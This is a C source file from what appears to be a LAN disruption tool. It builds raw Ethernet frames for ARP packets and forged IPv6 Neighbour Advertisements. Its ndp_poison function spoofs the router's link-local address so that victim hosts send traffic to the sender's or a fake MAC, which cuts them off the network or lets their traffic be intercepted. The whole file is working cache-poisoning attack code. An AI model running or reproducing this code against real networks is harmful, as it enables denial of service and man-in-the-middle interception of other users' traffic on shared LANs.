/* packet.c - frame construction and transmission (ARP + ICMPv6 NDP) */
#include "lanternet.h"

void send_frame(const unsigned char *dstmac, const unsigned char *srcmac,
                const unsigned char *payload, int plen, unsigned short ethertype){
    unsigned char pkt[2048];
    if(plen<0 || plen > (int)sizeof(pkt)-14) return;
    memcpy(pkt, dstmac, 6);
    memcpy(pkt+6, srcmac, 6);
    pkt[12]=(ethertype>>8)&0xff; pkt[13]=ethertype&0xff;
    memcpy(pkt+14, payload, plen);
    if(g_dry) return;
    struct sockaddr_ll d; memset(&d,0,sizeof d);
    d.sll_family=AF_PACKET; d.sll_ifindex=g_ifidx; d.sll_halen=6; d.sll_protocol=htons(ethertype);
    memcpy(d.sll_addr,dstmac,6);
    if(sendto(g_sock,pkt,14+plen,0,(struct sockaddr*)&d,sizeof d)<0) perror("sendto");
}

void send_arp(int op, const unsigned char *dstmac, unsigned int spa,
              const unsigned char *sha, unsigned int tpa, const unsigned char *thamac){
    unsigned char a[28]; memset(a,0,sizeof a);
    a[0]=0x00; a[1]=0x01;              /* ethernet */
    a[2]=0x08; a[3]=0x00;              /* IPv4 */
    a[4]=6; a[5]=4;
    a[6]=(op>>8)&0xff; a[7]=op&0xff;
    memcpy(a+8, sha, 6);
    memcpy(a+14, &spa, 4);
    memcpy(a+18, thamac, 6);
    memcpy(a+24, &tpa, 4);
    send_frame(dstmac, sha, a, 28, 0x0806);
}

/* EUI-64 link-local from a MAC: fe80::xxxx:xxff:fexx:xxxx */
void eui64_ll(const unsigned char *mac, unsigned char ll[16]){
    memset(ll,0,16);
    ll[0]=0xfe; ll[1]=0x80;
    ll[8]=mac[0]^0x02; ll[9]=mac[1]; ll[10]=mac[2]; ll[11]=0xff; ll[12]=0xfe;
    ll[13]=mac[3]; ll[14]=mac[4]; ll[15]=mac[5];
}

int router_ll_from_route(unsigned char ll[16]){
    FILE *f=fopen("/proc/net/ipv6_route","r");
    if(!f) return 0;
    char line[512]; int ok=0;
    while(fgets(line,sizeof line,f)){
        char dest[64],dplen[8],src[64],splen[8],nh[64],met[16],ref[16],use[16],fl[16],dev[64];
        if(sscanf(line,"%63s %7s %63s %7s %63s %15s %15s %15s %15s %63s",
                  dest,dplen,src,splen,nh,met,ref,use,fl,dev)>=10){
            if(strcmp(dest,"00000000000000000000000000000000")!=0) continue;
            if(strcmp(dplen,"00")!=0) continue;
            if(strcmp(nh,"00000000000000000000000000000000")==0) continue;
            if(g_ifname[0] && strcmp(dev,g_ifname)!=0) continue;
            if(strlen(nh)<32) continue;
            for(int i=0;i<16;i++){ char b[3]={nh[i*2], nh[i*2+1], 0}; ll[i]=(unsigned char)strtoul(b,NULL,16); }
            ok=1; break;
        }
    }
    fclose(f);
    return ok;
}

/* one's-complement checksum over a buffer */
unsigned short inet_csum(const unsigned char *b, int len){
    unsigned long s=0; int i;
    for(i=0;i+1<len;i+=2) s += ((unsigned)b[i]<<8)|b[i+1];
    if(len&1) s += (unsigned)b[len-1]<<8;
    while(s>>16) s=(s&0xffff)+(s>>16);
    return (unsigned short)~s;
}

/* ICMPv6 checksum: pseudo header + message */
unsigned short icmp6_csum(const unsigned char *src, const unsigned char *dst,
                          const unsigned char *msg, int len){
    unsigned long s=0; int i;
    for(i=0;i<16;i+=2) s += ((unsigned)src[i]<<8)|src[i+1];
    for(i=0;i<16;i+=2) s += ((unsigned)dst[i]<<8)|dst[i+1];
    s += (unsigned)((len>>16)&0xffff);
    s += (unsigned)(len&0xffff);
    s += 58;
    for(i=0;i+1<len;i+=2) s += ((unsigned)msg[i]<<8)|msg[i+1];
    if(len&1) s += (unsigned)msg[len-1]<<8;
    while(s>>16) s=(s&0xffff)+(s>>16);
    return (unsigned short)~s;
}

/* Unsolicited Neighbour Advertisement: "target_ll lives at claim_mac" */
void ndp_na(const unsigned char *dstmac, const unsigned char *src_ll,
            const unsigned char *dst_ll, const unsigned char *target_ll,
            const unsigned char *claim_mac, const unsigned char *src_mac){
    unsigned char p[40+32]; memset(p,0,sizeof p);
    p[0]=0x60;
    p[4]=0; p[5]=32;
    p[6]=58;
    p[7]=255;
    memcpy(p+8, src_ll, 16);
    memcpy(p+24, dst_ll, 16);
    unsigned char *ic=p+40;
    ic[0]=136; ic[1]=0;
    ic[4]=0x20;                       /* Override */
    memcpy(ic+8, target_ll, 16);
    ic[24]=2; ic[25]=1;
    memcpy(ic+26, claim_mac, 6);
    unsigned short cs = icmp6_csum(src_ll, dst_ll, ic, 32);
    ic[2]=(cs>>8)&0xff; ic[3]=cs&0xff;
    send_frame(dstmac, src_mac, p, 40+32, 0x86DD);
}

void ndp_poison(const struct host *h, int cut){
    if(!g_do_v6 || !g_v6_ok) return;
    unsigned char vic_ll[16]; eui64_ll(h->mac, vic_ll);
    const unsigned char *sender = g_use_fake ? g_fake_mac : g_mymac;
    if(cut){
        ndp_na(h->mac, g_router_ll, vic_ll, g_router_ll, sender, sender);
    } else {
        ndp_na(h->mac, g_router_ll, vic_ll, g_router_ll, g_gwmac, g_mymac);
    }
}
